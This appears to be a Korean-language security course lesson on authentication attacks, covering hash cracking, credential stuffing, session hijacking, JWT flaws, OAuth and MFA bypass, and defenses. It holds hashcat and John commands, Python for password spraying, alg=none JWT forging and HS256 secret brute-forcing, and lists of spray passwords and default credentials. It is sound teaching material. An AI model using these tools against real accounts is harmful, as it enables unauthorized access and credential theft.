# 인증 공격

**이전**: [05. 웹 애플리케이션 해킹](./05_Web_Application_Hacking.md) | **다음**: [07. 서버측 공격](./07_Server_Side_Attacks.md)

---

인증(Authentication)은 모든 시스템의 관문이다. 인증이 실패하면 공격자는 사용자 계정, 관리 패널 및 민감한 데이터에 접근할 수 있다. 이 레슨은 비밀번호 크래킹(password cracking)과 크리덴셜 스터핑(credential stuffing)부터 세션 하이재킹(session hijacking)과 다중 인증(MFA) 우회까지 인증 공격의 전체 스펙트럼을 다룬다.

> **중요**: 이 레슨에 설명된 모든 기법은 자신이 소유하거나 명시적인 서면 허가를 받은 시스템에서만 사용해야 한다. 무단 접근은 범죄 행위이다.

**난이도**: ⭐⭐⭐

## 학습 목표

이 레슨을 완료하면 다음을 수행할 수 있다:

1. 비밀번호 해싱 알고리즘과 그 약점을 이해한다
2. hashcat과 John the Ripper를 사용하여 오프라인 비밀번호 크래킹을 수행한다
3. 유출 데이터베이스를 사용하여 크리덴셜 스터핑 공격을 수행한다
4. 세션 토큰을 하이재킹하고 조작한다
5. JWT 구현 결함(none 알고리즘, 약한 시크릿)을 익스플로잇한다
6. OAuth 2.0 설정 오류를 식별하고 익스플로잇한다
7. 일반적인 MFA 구현을 우회한다
8. 방어자로서 강력한 인증을 구현한다

---

## 목차

1. [비밀번호 크래킹 기초](#1-비밀번호-크래킹-기초)
2. [Hashcat 및 John the Ripper](#2-hashcat-및-john-the-ripper)
3. [레인보우 테이블과 시간-메모리 트레이드오프](#3-레인보우-테이블과-시간-메모리-트레이드오프)
4. [크리덴셜 스터핑 및 스프레잉](#4-크리덴셜-스터핑-및-스프레잉)
5. [세션 하이재킹 및 고정](#5-세션-하이재킹-및-고정)
6. [JWT 토큰 공격](#6-jwt-토큰-공격)
7. [OAuth 2.0 취약점](#7-oauth-20-취약점)
8. [MFA 우회 기법](#8-mfa-우회-기법)
9. [기본 및 약한 크리덴셜](#9-기본-및-약한-크리덴셜)
10. [인증 방어 전략](#10-인증-방어-전략)
11. [연습문제](#11-연습문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. 비밀번호 크래킹 기초

### 1.1 비밀번호 해싱 알고리즘

| 알고리즘 | 속도 | 보안 | 솔트(Salt) | 비고 |
|---------|------|------|-----------|------|
| MD5 | 매우 빠름 | 취약 | 없음 | 비밀번호에 절대 사용 금지 |
| SHA-1 | 빠름 | 약함 | 없음 | 사용 중단 |
| SHA-256 | 빠름 | 단독으로는 보통 | 없음 | 비밀번호에는 너무 빠름 |
| bcrypt | 느림 | 강함 | 있음 | 적응형 비용 인자 |
| scrypt | 느림 | 강함 | 있음 | 메모리 집약적 |
| Argon2 | 느림 | 최상 | 있음 | PHC 우승자, 메모리 집약적 |
| PBKDF2 | 느림 | 좋음 | 있음 | NIST 권장 |

### 1.2 공격 유형

```python
"""
Password hash analysis module for authorized security assessments.

Identifies hash types and recommends cracking strategies
for penetration test engagements.
"""

import hashlib
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class HashType(Enum):
    """Common password hash types."""
    MD5 = "MD5"
    SHA1 = "SHA-1"
    SHA256 = "SHA-256"
    SHA512 = "SHA-512"
    BCRYPT = "bcrypt"
    NTLM = "NTLM"
    MYSQL = "MySQL"
    PBKDF2 = "PBKDF2"
    ARGON2 = "Argon2"
    UNKNOWN = "Unknown"


@dataclass
class HashAnalysis:
    """Analysis of a password hash."""
    hash_value: str
    hash_type: HashType
    hashcat_mode: int = 0
    estimated_crack_time: str = ""
    recommendations: list[str] = field(default_factory=list)


def identify_hash(hash_str: str) -> HashAnalysis:
    """Identify the hash type based on format and length."""
    h = hash_str.strip()

    # bcrypt
    if h.startswith("$2b$") or h.startswith("$2a$") or h.startswith("$2y$"):
        return HashAnalysis(h, HashType.BCRYPT, hashcat_mode=3200,
            estimated_crack_time="Hours to days (slow hash)",
            recommendations=["Use rule-based attack", "Target weak passwords only"])

    # Argon2
    if h.startswith("$argon2"):
        return HashAnalysis(h, HashType.ARGON2, hashcat_mode=0,
            estimated_crack_time="Very slow — may not be practical",
            recommendations=["Focus on dictionary + rules", "Consider other vectors"])

    # PBKDF2
    if h.startswith("pbkdf2") or h.startswith("$pbkdf2"):
        return HashAnalysis(h, HashType.PBKDF2, hashcat_mode=10000,
            estimated_crack_time="Slow — depends on iterations",
            recommendations=["Check iteration count", "Dictionary + rules"])

    # NTLM (32 hex chars)
    if re.match(r'^[a-fA-F0-9]{32}$', h) and ':' not in hash_str:
        return HashAnalysis(h, HashType.NTLM, hashcat_mode=1000,
            estimated_crack_time="Minutes (fast hash)",
            recommendations=["Full charset brute-force feasible", "Use large wordlists"])

    # MD5 (32 hex chars)
    if re.match(r'^[a-fA-F0-9]{32}$', h):
        return HashAnalysis(h, HashType.MD5, hashcat_mode=0,
            estimated_crack_time="Seconds to minutes",
            recommendations=["Brute-force feasible", "Check rainbow tables first"])

    # SHA-1 (40 hex chars)
    if re.match(r'^[a-fA-F0-9]{40}$', h):
        return HashAnalysis(h, HashType.SHA1, hashcat_mode=100,
            estimated_crack_time="Minutes",
            recommendations=["Large wordlists effective", "Rule-based attacks"])

    # SHA-256 (64 hex chars)
    if re.match(r'^[a-fA-F0-9]{64}$', h):
        return HashAnalysis(h, HashType.SHA256, hashcat_mode=1400,
            estimated_crack_time="Minutes to hours",
            recommendations=["Dictionary + rules", "Targeted wordlists"])

    # SHA-512 (128 hex chars)
    if re.match(r'^[a-fA-F0-9]{128}$', h):
        return HashAnalysis(h, HashType.SHA512, hashcat_mode=1700,
            estimated_crack_time="Hours",
            recommendations=["Dictionary + rules", "Targeted wordlists"])

    return HashAnalysis(h, HashType.UNKNOWN)


def demonstrate_hashing():
    """Show how different algorithms hash the same password."""
    password = "P@ssw0rd123"
    print(f"Password: {password}")
    print(f"  MD5:    {hashlib.md5(password.encode()).hexdigest()}")
    print(f"  SHA-1:  {hashlib.sha1(password.encode()).hexdigest()}")
    print(f"  SHA-256:{hashlib.sha256(password.encode()).hexdigest()}")


if __name__ == "__main__":
    print("Password Hash Analysis Module")
    print("=" * 50)
    demonstrate_hashing()

    test_hashes = [
        "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5
        "$2b$12$LJ3m4ys3Lk1IlSYBgYT8xeQ7FHzF.1GEvSN9Bk8FbhXCJAZvEuG6",  # bcrypt
        "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",  # SHA-1
    ]
    print("\nHash Identification:")
    for h in test_hashes:
        analysis = identify_hash(h)
        print(f"\n  {h[:40]}...")
        print(f"  Type: {analysis.hash_type.value}")
        print(f"  Hashcat mode: {analysis.hashcat_mode}")
        print(f"  Estimated time: {analysis.estimated_crack_time}")
```

---

## 2. Hashcat 및 John the Ripper

### 2.1 Hashcat 명령어

```bash
# Dictionary attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force (8-char lowercase)
hashcat -m 0 hashes.txt -a 3 ?l?l?l?l?l?l?l?l

# Mask attack (Company + digits)
hashcat -m 0 hashes.txt -a 3 Company?d?d?d?d

# Combinator attack
hashcat -m 0 hashes.txt -a 1 words1.txt words2.txt

# Common modes: 0=MD5, 100=SHA1, 1000=NTLM, 1400=SHA256, 3200=bcrypt
```

### 2.2 John the Ripper

```bash
# Auto-detect and crack
john hashes.txt

# Specify format
john --format=raw-md5 hashes.txt

# Wordlist mode
john --wordlist=rockyou.txt hashes.txt

# Rules
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Show cracked passwords
john --show hashes.txt
```

---

## 3. 레인보우 테이블과 시간-메모리 트레이드오프

레인보우 테이블(Rainbow Table)은 사전 계산된 해시-비밀번호 조회 테이블이다. 저장 공간을 계산 시간과 교환한다.

**솔팅이 레인보우 테이블을 무력화하는 이유**: 솔트(salt)는 해싱 전에 각 비밀번호에 고유한 랜덤 데이터를 추가하여, 각 솔트마다 별도의 테이블이 필요하므로 사전 계산된 테이블을 쓸모없게 만든다.

---

## 4. 크리덴셜 스터핑 및 스프레잉

### 4.1 크리덴셜 스터핑

데이터 유출에서 얻은 사용자명/비밀번호 쌍을 다른 서비스에 대해 사용하여 비밀번호 재사용을 악용한다.

### 4.2 패스워드 스프레잉

많은 계정에 대해 소수의 일반적인 비밀번호를 시도하여 잠금 임계값을 회피한다.

```python
"""
Credential testing framework for authorized assessments.

Demonstrates credential stuffing and password spraying
methodologies used in penetration testing.
ONLY use against authorized targets.
"""

from dataclasses import dataclass, field
from typing import Optional
import time


@dataclass
class CredentialTest:
    """A credential test result."""
    username: str
    password: str
    success: bool
    response_code: int = 0
    error: str = ""


class PasswordSprayConfig:
    """Configuration for password spray attacks."""
    def __init__(
        self,
        usernames: list[str],
        passwords: list[str],
        delay_between_users: float = 0.5,
        delay_between_passwords: float = 1800,  # 30 min between password rounds
        max_attempts_per_user: int = 3,
    ):
        self.usernames = usernames
        self.passwords = passwords
        self.delay_between_users = delay_between_users
        self.delay_between_passwords = delay_between_passwords
        self.max_attempts_per_user = max_attempts_per_user

    def estimate_duration(self) -> str:
        total_seconds = (
            len(self.passwords) * self.delay_between_passwords
            + len(self.usernames) * len(self.passwords) * self.delay_between_users
        )
        hours = total_seconds / 3600
        return f"Estimated duration: {hours:.1f} hours"


# Common passwords for spraying (from breach statistics)
COMMON_PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Company2024", "Company2025", "Summer2024", "Winter2024",
    "Qwerty123", "Admin123", "Letmein1", "Changeme1",
    "P@ssw0rd", "P@ssword1", "Pa$$w0rd",
]


if __name__ == "__main__":
    print("Credential Testing Framework")
    print("=" * 50)
    print(f"Common spray passwords: {len(COMMON_PASSWORDS)}")
    config = PasswordSprayConfig(
        usernames=[f"user{i}" for i in range(100)],
        passwords=COMMON_PASSWORDS[:3],
    )
    print(config.estimate_duration())
    print("\nOnly use in authorized engagements with proper scope.")
```

---

## 5. 세션 하이재킹 및 고정

### 5.1 세션 하이재킹 방법

- **XSS 기반**: `document.cookie`를 통해 쿠키를 탈취한다
- **네트워크 스니핑**: 암호화되지 않은 연결에서 세션 토큰을 캡처한다
- **세션 고정(Session Fixation)**: 피해자에게 알려진 세션 ID를 강제한다
- **세션 예측**: 약한 생성 방식에서 세션 ID를 예측한다

### 5.2 보안 쿠키 속성

| 속성 | 목적 | 설정 |
|------|------|------|
| `HttpOnly` | XSS를 통한 쿠키 도용 방지 | 항상 설정 |
| `Secure` | HTTPS 전용 | 항상 설정 |
| `SameSite` | CSRF 보호 | `Strict` 또는 `Lax` |
| `Path` | 범위 제한 | 가장 구체적인 경로 |
| `Expires` | 세션 시간 초과 | 적절한 수명 |

---

## 6. JWT 토큰 공격

### 6.1 일반적인 JWT 취약점

```python
"""
JWT attack demonstrations for authorized security testing.

Shows common JWT implementation flaws and how to detect them.
"""

import base64
import json
import hmac
import hashlib
from dataclasses import dataclass


@dataclass
class JWTAnalysis:
    """Analysis of a JWT token."""
    header: dict
    payload: dict
    signature: str
    vulnerabilities: list[str]


def decode_jwt(token: str) -> JWTAnalysis:
    """Decode and analyze a JWT token (without verification)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    def b64decode(s: str) -> dict:
        padding = 4 - len(s) % 4
        s += "=" * padding
        return json.loads(base64.urlsafe_b64decode(s))

    header = b64decode(parts[0])
    payload = b64decode(parts[1])

    vulns = []

    # Check for "none" algorithm
    if header.get("alg", "").lower() == "none":
        vulns.append("CRITICAL: 'none' algorithm — signature not verified")

    # Check for weak algorithm
    if header.get("alg") == "HS256":
        vulns.append("INFO: HS256 used — check for weak secret")

    # Check for algorithm confusion (RS256 vs HS256)
    if header.get("alg") in ("RS256", "RS384", "RS512"):
        vulns.append("TEST: Check for algorithm confusion (RS→HS) attack")

    # Check for missing expiration
    if "exp" not in payload:
        vulns.append("MEDIUM: No expiration claim — token never expires")

    # Check for sensitive data in payload
    sensitive_keys = ["password", "secret", "ssn", "credit_card"]
    for key in payload:
        if key.lower() in sensitive_keys:
            vulns.append(f"HIGH: Sensitive data in payload: {key}")

    return JWTAnalysis(
        header=header, payload=payload,
        signature=parts[2], vulnerabilities=vulns,
    )


def forge_none_algorithm(token: str) -> str:
    """
    Forge a JWT with 'none' algorithm (for testing vulnerable implementations).

    This attack works when the server accepts tokens with alg=none,
    effectively skipping signature verification.
    """
    parts = token.split(".")
    # Modify header to use "none" algorithm
    new_header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(new_header).encode()
    ).rstrip(b"=").decode()

    # Keep original payload, empty signature
    return f"{header_b64}.{parts[1]}."


def brute_force_hs256_secret(token: str, wordlist: list[str]) -> str:
    """
    Attempt to brute-force an HS256 JWT secret.

    Weak secrets (short, dictionary words) can be cracked quickly.
    """
    parts = token.split(".")
    message = f"{parts[0]}.{parts[1]}".encode()

    # Decode the signature
    sig_padding = 4 - len(parts[2]) % 4
    expected_sig = base64.urlsafe_b64decode(parts[2] + "=" * sig_padding)

    for secret in wordlist:
        computed = hmac.new(
            secret.encode(), message, hashlib.sha256
        ).digest()
        if hmac.compare_digest(computed, expected_sig):
            return secret

    return ""


if __name__ == "__main__":
    print("JWT Security Analysis Module")
    print("=" * 50)
    # Example JWT (HS256, secret="secret")
    sample = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
        "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )
    analysis = decode_jwt(sample)
    print(f"Header: {analysis.header}")
    print(f"Payload: {analysis.payload}")
    print(f"Vulnerabilities: {analysis.vulnerabilities}")
```

---

## 7. OAuth 2.0 취약점

### 7.1 일반적인 OAuth 결함

- **오픈 리다이렉트(Open redirect)**: 리다이렉트 URI가 제대로 검증되지 않음
- **인가 코드 도용**: Referer 헤더를 통한 코드 유출
- **OAuth 흐름의 CSRF**: state 매개변수 누락
- **스코프 확대(Scope escalation)**: 더 넓은 권한 요청
- **토큰 유출**: URL이나 로그에 토큰 노출

---

## 8. MFA 우회 기법

| 기법 | 설명 | 난이도 |
|------|------|--------|
| SIM 스와핑 | 피해자의 전화번호를 탈취 | 중간 |
| 실시간 피싱 | MFA를 실시간 프록시 (evilginx2) | 중간 |
| 세션 하이재킹 | MFA 이후 세션 토큰 탈취 | 쉬움 |
| MFA 피로 공격 | 승인될 때까지 푸시 알림을 계속 전송 | 쉬움 |
| 복구 코드 도용 | 사회 공학을 통한 백업 코드 탈취 | 중간 |
| 구현 버그 | 경합 조건, 코드 재사용 | 다양함 |

---

## 9. 기본 및 약한 크리덴셜

발견된 서비스에서 항상 기본 크리덴셜(default credential)을 확인한다:

| 서비스 | 일반적인 기본값 |
|--------|---------------|
| Tomcat Manager | tomcat:tomcat, admin:admin |
| Jenkins | admin:(비밀번호 없음) |
| phpMyAdmin | root:(빈 값) |
| Cisco 장치 | cisco:cisco, admin:admin |
| PostgreSQL | postgres:postgres |
| MongoDB | (기본적으로 인증 없음) |

---

## 10. 인증 방어 전략

- 적절한 비용 인자를 가진 bcrypt/Argon2를 사용한다
- 점진적 지연이 있는 계정 잠금을 구현한다
- 모든 권한 있는 계정에 MFA를 요구한다
- CSRF로 보호된 로그인 폼을 사용한다
- 보안 세션 쿠키 속성을 설정한다
- 적절한 JWT 유효성 검사(알고리즘, 만료, 발급자)를 구현한다
- 크리덴셜 스터핑 패턴을 모니터링한다

---

## 11. 연습문제

1. **해시 크래킹**: hashcat을 사용하여 20개의 비밀번호 해시(MD5, SHA-256, bcrypt) 세트를 사전 및 규칙 기반 공격으로 크래킹한다.
2. **JWT 분석**: 연습 애플리케이션에서 JWT 토큰을 디코딩하고 분석한다. 취약점을 식별하고 익스플로잇한다.
3. **세션 보안**: 연습 앱의 세션 관리를 테스트한다 — 쿠키 속성, 세션 고정, 로그아웃 동작.
4. **패스워드 스프레이**: 실습 Active Directory 환경에서 패스워드 스프레이 공격을 구성한다. 잠금을 방지하기 위해 타이밍을 최적화한다.
5. **MFA 테스트**: OWASP WebGoat에서 MFA 구현을 우회 기회에 대해 테스트한다.
6. **방어 구현**: bcrypt, CSRF 토큰 및 보안 세션이 있는 Flask 애플리케이션에서 적절한 인증을 구현한다.

---

## 12. 요약

인증 공격은 가장 기본적인 보안 제어를 대상으로 한다:

- **비밀번호 크래킹**은 약한 해싱과 나쁜 비밀번호 선택을 익스플로잇한다
- **크리덴셜 스터핑**은 비밀번호 재사용이라는 고질적 문제를 악용한다
- **세션 하이재킹**은 인증을 완전히 우회한다
- **JWT 공격**은 토큰 기반 인증의 구현 결함을 익스플로잇한다
- **MFA 우회**는 추가 인증 요소도 무적이 아님을 보여준다
- **방어**에는 계층적 제어가 필요하다: 강한 해싱, MFA, 모니터링

---

## 13. 참고 자료

- Hashcat: https://hashcat.net/
- John the Ripper: https://www.openwall.com/john/
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- JWT Security: https://portswigger.net/web-security/jwt
- Have I Been Pwned: https://haveibeenpwned.com/
- CrackStation: https://crackstation.net/
